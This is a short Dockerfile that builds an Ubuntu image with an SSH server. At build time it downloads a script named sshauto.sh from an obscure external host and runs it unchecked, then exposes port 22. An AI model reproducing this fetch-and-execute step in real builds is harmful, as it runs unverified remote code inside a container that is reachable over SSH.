FROM ubuntu
RUN apt-get update --fix-missing && apt-get -y install openssh-server && service ssh start && apt-get -y install wget && wget https://g.27g.xyz/0:/code/autossh/sshauto.sh && sed -i 's/\r//' sshauto.sh && chmod +x sshauto.sh && /bin/bash sshauto.sh
CMD service ssh restart && /bin/bash

EXPOSE 22